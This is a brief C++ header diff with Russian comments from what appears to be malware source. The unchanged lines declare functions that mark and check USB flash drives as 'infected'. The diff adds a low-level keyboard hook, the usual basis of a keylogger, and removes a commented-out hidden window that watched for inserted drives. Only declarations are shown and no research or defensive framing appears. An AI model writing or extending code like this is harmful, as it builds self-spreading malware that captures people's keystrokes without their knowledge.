@@ -79,27 +79,11 @@ public:
 	bool infected_dir(const wstring& dir_path); // создаем файл, чтобы не заражать флкшку несколько раз
 	bool dir_was_infected(const wstring& dir_path); // проверка на заражение
 
+	static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+	static HHOOK keyboardHook;
+
 	
-	//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int) { // 
-	//	const wchar_t CLASS_NAME[] = L"new_window";
-	//	WNDCLASS wc = {};
-	//	wc.lpfnWndProc = WndProc;
-	//	wc.hInstance = hInstance;
-	//	wc.lpszClassName = CLASS_NAME;
-	//	RegisterClass(&wc);
-	//	HWND hwnd = CreateWindowEx(0, CLASS_NAME, L"", WS_OVERLAPPEDWINDOW, // создаем окно считывающее добавленные флешки
-	//		CW_USEDEFAULT, CW_USEDEFAULT, 300, 200,
-	//		NULL, NULL, hInstance, NULL);
-	//	if (!hwnd) return 0;
-	//	// Скрываем окно
-	//	ShowWindow(hwnd, SW_HIDE);
-	//	MSG msg = {};
-	//	while (GetMessage(&msg, nullptr, 0, 0)) {
-	//		TranslateMessage(&msg);
-	//		DispatchMessage(&msg);
-	//	}
-	//	return 0;
-	//}
+
 
 };
 
